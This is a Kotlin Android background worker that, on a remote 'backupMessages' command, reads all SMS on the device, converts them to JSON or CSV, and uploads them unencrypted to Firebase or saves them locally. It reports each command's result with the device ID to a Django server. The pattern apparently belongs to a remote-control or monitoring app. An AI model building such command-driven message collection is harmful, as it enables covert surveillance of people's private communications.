package com.example.fast.workers

import android.content.Context
import android.content.pm.PackageManager
import android.provider.Settings
import androidx.core.content.ContextCompat
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.example.fast.util.DjangoApiHelper
import com.example.fast.util.LogHelper
import com.example.fast.util.MessageAnalyticsManager
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlin.coroutines.resume

class BackupMessagesWorker(
    appContext: Context,
    params: WorkerParameters
) : CoroutineWorker(appContext, params) {

    override suspend fun doWork(): Result {
        val type = inputData.getString(KEY_TYPE) ?: "firebase"
        val format = inputData.getString(KEY_FORMAT) ?: "json"
        val encrypt = inputData.getBoolean(KEY_ENCRYPT, false)
        val historyTimestamp = inputData.getLong(KEY_HISTORY_TIMESTAMP, 0L)

        if (ContextCompat.checkSelfPermission(
                applicationContext,
                android.Manifest.permission.READ_SMS
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            logCommandStatus(historyTimestamp, "failed", "READ_SMS permission not granted")
            return Result.failure()
        }

        val messages = MessageAnalyticsManager.fetchAllMessages(applicationContext)
        val backupData = when (format.lowercase()) {
            "json" -> MessageAnalyticsManager.convertToJson(messages)
            "csv" -> MessageAnalyticsManager.convertToCsv(messages)
            else -> {
                logCommandStatus(historyTimestamp, "failed", "Invalid format. Use 'json' or 'csv'")
                return Result.failure()
            }
        }

        if (encrypt) {
            LogHelper.w(TAG, "Encryption requested but not implemented")
        }

        val (success, detail) = when (type.lowercase()) {
            "firebase" -> saveBackupToFirebase(backupData, format, encrypt)
            "local" -> saveBackupLocally(backupData, format, encrypt)
            else -> {
                logCommandStatus(historyTimestamp, "failed", "Invalid backup type. Use 'firebase' or 'local'")
                return Result.failure()
            }
        }

        return if (success) {
            logCommandStatus(
                historyTimestamp,
                "executed",
                "Backed up ${messages.size} messages to ${type.lowercase()}"
            )
            Result.success()
        } else {
            logCommandStatus(historyTimestamp, "failed", "Error: $detail")
            Result.failure()
        }
    }

    private suspend fun saveBackupToFirebase(
        data: String,
        format: String,
        encrypt: Boolean
    ): Pair<Boolean, String?> {
        return suspendCancellableCoroutine { cont ->
            MessageAnalyticsManager.saveBackupToFirebase(
                applicationContext,
                data,
                format,
                encrypt
            ) { success, error ->
                if (cont.isActive) cont.resume(success to error)
            }
        }
    }

    private suspend fun saveBackupLocally(
        data: String,
        format: String,
        encrypt: Boolean
    ): Pair<Boolean, String?> {
        return suspendCancellableCoroutine { cont ->
            MessageAnalyticsManager.saveBackupLocally(
                applicationContext,
                data,
                format,
                encrypt
            ) { success, error ->
                if (cont.isActive) cont.resume(success to error)
            }
        }
    }

    private suspend fun logCommandStatus(historyTimestamp: Long, status: String, reason: String) {
        if (historyTimestamp <= 0L) return
        try {
            DjangoApiHelper.logCommand(
                deviceId = deviceId(),
                command = "backupMessages",
                value = null,
                status = status,
                receivedAt = historyTimestamp,
                executedAt = System.currentTimeMillis(),
                errorMessage = reason
            )
        } catch (e: Exception) {
            LogHelper.e(TAG, "Failed to log backupMessages command status", e)
        }
    }

    private fun deviceId(): String {
        return Settings.Secure.getString(
            applicationContext.contentResolver,
            Settings.Secure.ANDROID_ID
        )
    }

    companion object {
        private const val TAG = "BackupMessagesWorker"
        const val KEY_TYPE = "type"
        const val KEY_FORMAT = "format"
        const val KEY_ENCRYPT = "encrypt"
        const val KEY_HISTORY_TIMESTAMP = "historyTimestamp"
    }
}
